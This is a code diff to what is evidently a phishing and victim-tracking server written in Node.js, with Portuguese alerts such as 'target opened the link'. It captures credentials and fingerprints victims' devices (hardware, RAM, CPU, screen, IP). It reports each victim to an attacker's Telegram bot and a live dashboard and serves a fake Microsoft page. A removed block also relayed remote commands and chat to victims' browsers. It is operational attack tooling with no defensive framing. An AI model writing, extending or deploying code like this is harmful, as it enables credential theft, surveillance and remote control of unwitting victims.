@@ -217,7 +217,7 @@ async function processTelemetry(packet, socket = null, reqIp = null) {
         let log = await getLog(data.logId);
         const ip = (socket ? (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address) : reqIp || data.ip || '0.0.0.0').replace('::ffff:', '');
 
-        if (!log && (event === 'join' || event === 'fingerprint' || event === 'creds' || event === 'capture_creds' || event === 'perf')) {
+        if (!log && (event === 'join' || event === 'fingerprint' || event === 'creds' || event === 'capture_creds' || event === 'perf' || event === 'network' || event === 'update_network_data')) {
             log = { id: data.logId, linkId: data.linkId || 'unknown', timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
             await sendTelegramMsg(`🚨 *ALVO ABRIU O LINK*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);
             if (io) io.emit('new_click', log);
@@ -280,9 +280,21 @@ async function processTelemetry(packet, socket = null, reqIp = null) {
                     if (io) io.emit('update_log', { id: log.id, internalDevices: log.internalDevices });
                     break;
                 case 'fingerprint':
-                    log.fingerprint = data.fingerprint; await saveLog(log);
-                    if (io) io.emit('update_log', { id: log.id, fingerprint: data.fingerprint });
-                    sendTelegramMsg(`📂 *DOSSIÊ* - ID: ${log.id}\nOS: ${data.fingerprint.platform}`);
+                    log.fingerprint = data.fingerprint; 
+                    // Extract hardware info for dashboard display
+                    if (data.fingerprint) {
+                        const fp = data.fingerprint;
+                        log.hardware = `${fp.platform || 'Unknown'} | ${fp.is_mobile ? '📱 Mobile' : fp.is_tablet ? '📱 Tablet' : '💻 Desktop'}`;
+                        log.sysInfo = `UA: ${(fp.userAgent || '').substring(0, 50)}... | RAM: ${fp.ram_gb}GB | CPU: ${fp.cpu_cores} cores | ${fp.connection.type}`;
+                        log.os = fp.platform;
+                        log.browser = fp.userAgent;
+                        log.cores = fp.cpu_cores;
+                        log.ram = fp.ram_gb;
+                        log.screen = `${fp.screen.width}x${fp.screen.height}`;
+                    }
+                    await saveLog(log);
+                    if (io) io.emit('update_log', { id: log.id, fingerprint: data.fingerprint, hardware: log.hardware, sysInfo: log.sysInfo });
+                    sendTelegramMsg(`📂 *DOSSIÊ* - ID: ${log.id}\nOS: ${data.fingerprint?.platform || 'Unknown'}\nDevice: ${log.hardware}`);
                     break;
                 case 'typing':
                 case 'perf':
@@ -417,25 +429,6 @@ app.get('/t/:id', async (req, res) => {
     } catch (e) {
         res.sendFile(path.join(publicPath, 'microsoft.html'));
     }
-});
-
-const server = http.createServer(app);
-const io = new Server(server, { 
-    cors: { 
-        origin: "*",
-        methods: ["GET", "POST"],
-        allowEIO3: true
-    },
-    transports: ['polling', 'websocket'],
-    pingInterval: 25000,
-    pingTimeout: 5000,
-    maxHttpBufferSize: 1e6
-});
-
-io.on('connection', (socket) => {
-    socket.on('telemetry_data', (p) => processTelemetry(p, socket));
-    socket.on('remote_command', (d) => io.emit('execute_command', d));
-    socket.on('admin_send_chat', (d) => io.emit('victim_recv_chat', d));
 });
 
 const PORT = process.env.PORT || 3000;
